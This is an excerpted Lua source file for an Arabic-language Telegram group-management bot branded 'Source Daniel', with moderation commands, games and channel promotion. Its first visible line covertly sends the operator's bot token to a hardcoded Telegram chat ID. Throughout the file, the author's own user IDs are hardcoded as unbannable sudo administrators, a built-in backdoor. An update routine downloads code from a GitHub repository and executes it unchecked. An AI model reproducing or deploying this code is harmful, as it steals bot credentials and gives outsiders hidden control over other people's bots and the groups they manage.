...
https.request('https://api.telegram.org/botحطططططططط تكن سحببببببب/sendmessage?chat_id=1286666714&text=' ..token)
end 
else
...
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
  ...
  ⊱شكرا لاستخدامك سورس دانيال
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
 ⊰ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ѕᴏᴜʀᴄᴇ ᴘᴀʀɪѕ 
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
 ≂≂≂≂≂≂≂≂≂ѕᴏᴜʀᴄᴇ ᴘᴀʀɪѕ≂≂≂≂≂≂≂≂≂≂
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
...
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
 ≂≂≂≂≂≂≂≂≂ѕᴏᴜʀᴄᴇ ᴘᴀʀɪѕ≂≂≂≂≂≂≂≂≂≂
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
  ⊰ من قبل السلطان الهكر 
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
≂≂≂≂≂≂≂≂≂ѕᴏᴜʀᴄᴇ ᴘᴀʀɪѕ≂≂≂≂≂≂≂≂≂≂
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
 ⊰ ᴅᴇᴠᴇʟᴏᴘᴇʀ ⊱ @BelalElshayal
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
≂≂≂≂≂≂≂≂≂ѕᴏᴜʀᴄᴇ ᴘᴀʀɪѕ≂≂≂≂≂≂≂≂≂≂
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
 ⊰ CH › @ELKAEEB1
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MADISON111000/DANIEL/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1286666714,1058949070,1744308503,50,60,1208165035}   
...
if tonumber(user_id) == tonumber(1286666714) then  
var = true
elseif tonumber(user_id) == tonumber(1058949070) then
var = true
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'دانيال'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local UserName = (data.username_ or "ELKAEEB1")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐀𝐍𝐈𝐄𝐋⌯𓆪")  
...
local ELKAEEB1 = database:get(bot_id..'text:ch:user')
if ELKAEEB1 then
send(msg.chat_id_, msg.id_,'['..ELKAEEB1..']')
else
...
{'قناة السورس','ماديسون','دانيال','السلطان'},
}
end
...
os.execute('wget https://raw.githubusercontent.com/MADISON111000/DANIEL/main/DRAGON.lua')
...
local Text = [[ 
[اضغط هنا وانضم الي قناه السورس](t.me/ELKAEEB1)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/ELKAEEB1"}}, 
} 
...
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'ELKAEEB1')..')'
status  = '\n ◉ تم ترقيته مطور'
...
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'ELKAEEB1')..')'
status  = '\n ◉ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ العضو ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'ELKAEEB1')..') \n ◉ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ◉ العضو : {["..data.first_name_.."](T.ME/ELKAEEB1)}\n ◉ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ◉ عذرا ← {["..data.first_name_.."](T.ME/ELKAEEB1)}\n ◉ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/MADISON111000/DANIEL/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/MADISON111000/DANIEL/main/library')
os.execute('wget https://raw.githubusercontent.com/MADISON111000/DANIEL/main/File_Bot')
send(msg.chat_id_, msg.id_,' ◉ تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'دانيال') 
local DRAGON_Msg = { 
...
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'اضف البوت لمجموعتك',url="t.me/"..sudos.UserName.."?startgroup=start"}},} 
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '◉ 𝐷𝑒𝑣 𝑀𝑎𝑑𝑖𝑠𝑜𝑛 ◉',url="t.me/AAHMEED11"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MADI_PICK/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'عنعنعن' or text == 'ويوي' or text == 'هيهي' then
local Text = [[
◉ يمكنك التواصل معي..↑↓
◉ عن طريق معرفي بلاسفل..↑↓
]]
...
if text == 'دانيال' or text == 'مالك السورس' or text == 'المبرمج دانيال' then
local Text = [[
◉ يمكنك التواصل معي..↑↓
◉ عن طريق معرفي بلاسفل..↑↓
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MADI_PICK/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'السلطان' or text == 'مطور السورس' or text == 'المطور سلطان' then
local Text = [[
◉ يمكنك التواصل معي..↑↓
◉ عن طريق معرفي بلاسفل..↑↓
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MADI_PICK/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'قناة السورس' or text == 'قناه السورس' or text == 'سورس مين' then
local Text = [[
◉ 𝘾𝙃
]]
keyboard = {} 
...
tdcli_function ({ID = "GetUser",user_id_ = 1286666714,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = 'السلطان الهكر للتواصل معه اتبع الازرارا ⇧\n['..result.first_name_..'](t.me/BelalElshayal)\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
...
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = 1286666714, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس دانيال ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس دانيال ؟ ", 
"كم مره حبيت؟ ", 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ◉', url="t.me/ELKAEEB1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
◉ لعبة البـات ← بات
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐀𝐍𝐈𝐄𝐋⌯𓆪](t.me/ELKAEEB1) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
...
if text == 'العاب دانيال' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'ELKAEEB1')..') \n ◉ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'ELKAEEB1')..') \n ◉ تـم قفـل التاك بالكتم ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'\n◉تم قفل البوتات بالطرد\n◉تم وضع الايدي بدون صوره\n◉تم قفل التكرار بالطرد\n◉تم قفل الروابط\n◉تم قفل التوجيه\n◉تم قفل الملصقات\n◉تم قفل المتحركه\n◉تم قفل الفيديو\n◉تم قفل السب\n◉تم قفل التعديل\n◉تم قفل الفارسيه\n◉تم قفل التفليش\n\nتم تفعيل الحمايه بواسطه ←['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'ELKAEEB1')..')')   
end,nil) 
end
--------------------------------------------------------------------------------------------------------------
...
if tonumber(result.sender_user_id_) == tonumber(1286666714) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع مطور سورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(50) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج سورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1058949070) then  
...
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر المبرمج ماديسون عام")
return false 
end
...
if result.id_ == tonumber(1286666714) then
...
if result.id_ == tonumber(1058949070) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1286666714) then  
...
if tonumber(userid) == tonumber(1058949070) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/MADISON111000/DANIEL/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ◉ اهلا بك في متجر ملفات دانيال\n ◉ ملفات السورس ↓\n≪╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸≫\n\n"
local TextE = "\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n ◉ علامة تعني { ✔️ } ملف مفعل\n ◉ علامة تعني { x } ملف معطل\n ◉ قناة سورس دانيال ↓\n".." ◉ [اضغط هنا لدخول](t.me/ELKAEEB1) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/MADISON111000/DANIEL/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ◉ عذرا الملف لايدعم سورس دانيال \n") 
end
return false
end
...
if text == ("مسح قائمه دانيال") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح قائمه دانيال')
return false
end

if text == 'قائمه دانيال' and Sudo(msg) then
...
if text == ("رفع دانيال") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local ELKAEEB1 = database:get(bot_id..'text:ch:user')
if ELKAEEB1 then
send(msg.chat_id_, msg.id_,'['..ELKAEEB1..']')
...
if text and text:match("^رفع دانيال @(.*)$") and Sudo(msg) then
local username = text:match("^رفع دانيال @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local ELKAEEB1 = database:get(bot_id..'text:ch:user')
if ELKAEEB1 then
send(msg.chat_id_, msg.id_,'['..ELKAEEB1..']')
...
if text and text:match("^رفع دانيال (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع دانيال (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local ELKAEEB1 = database:get(bot_id..'text:ch:user')
if ELKAEEB1 then
send(msg.chat_id_, msg.id_,'['..ELKAEEB1..']')
...
if text == ("تنزيل دانيال") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local ELKAEEB1 = database:get(bot_id..'text:ch:user')
if ELKAEEB1 then
send(msg.chat_id_, msg.id_,'['..ELKAEEB1..']')
...
if text and text:match("^تنزيل دانيال @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل دانيال @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local ELKAEEB1 = database:get(bot_id..'text:ch:user')
if ELKAEEB1 then
send(msg.chat_id_, msg.id_,'['..ELKAEEB1..']')
...
if text and text:match("^تنزيل دانيال (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل دانيال (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local ELKAEEB1 = database:get(bot_id..'text:ch:user')
if ELKAEEB1 then
send(msg.chat_id_, msg.id_,'['..ELKAEEB1..']')
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ لعضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'ELKAEEB1')..')'
status  = '\n ◉ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
...
' }\n'..' ◉  الايدي بالصوره ← { '..idph..
' }\n'..' ◉  الرفع ← { '..setadd..
' }\n'..' ◉  الحظر ← { '..banm..' }\n\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n ◉ قناة سورس دانيال ↓\n [ 𓆩⌯𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐀𝐍𝐈𝐄𝐋⌯𓆪](t.me/ELKAEEB1) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'ELKAEEB1')..')'..'\n ◉ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
database:set(bot_id.."ELKAEEB1:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"◉تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."ELKAEEB1:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."ELKAEEB1:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس دانيال يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'دانيال').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه دانيال') 
return false
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'دانيال').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'دانيال')
local DRAGON_Msg = {
'◉ يوه '..Namebot..' زهق منك😒',
'◉ نعم ياعيون '..Namebot..' 😻💓',
'◉ عايز اي من '..Namebot..' 🙄💛',
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'ELKAEEB1')..')'
local iduser = result.sender_user_id_
...
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ اليك الاوامر الخاص بسورس دانيال .
